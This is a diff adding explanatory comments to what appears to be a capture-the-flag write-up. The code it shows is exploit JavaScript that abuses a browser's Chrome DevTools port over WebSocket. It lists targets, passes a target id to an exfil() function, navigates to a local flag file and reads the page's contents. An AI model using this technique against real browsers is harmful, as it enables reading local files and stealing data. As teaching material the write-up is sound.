@@ -713,6 +713,7 @@ Let's illustrate that in code:
         }
 
         ws.onopen = () => {
+	        // once socket is open, we will ask for current targets
             ws.send(
                 JSON.stringify({
                     id: 1,
@@ -723,17 +724,19 @@ Let's illustrate that in code:
 
         ws.onmessage = (event) => {
             let data = JSON.parse(event.data);
-
+			
+			// grab the targetId returned by Target.getTargets
             const targetId = data.result.targetInfos[1].targetId;
             exfil(targetId);
 
-			// open new socket in page context
+			// open new socket in page context using the targetId we got
             const ws = new WebSocket(
                 `http://localhost:${port}/devtools/page/${targetId}`
             );
 
-			// navigate to flag
+			// once new socket is open
             ws.onopen = () => {
+	            // navigate to flag local path
                 ws.send(
                     JSON.stringify({
                         id: 1,
@@ -744,6 +747,7 @@ Let's illustrate that in code:
 
 				// wait for flag to load before checking the page's content
                 setTimeout(() => {
+					// evaluate document contents
                     ws.send(
                         JSON.stringify({
                             id: 2,
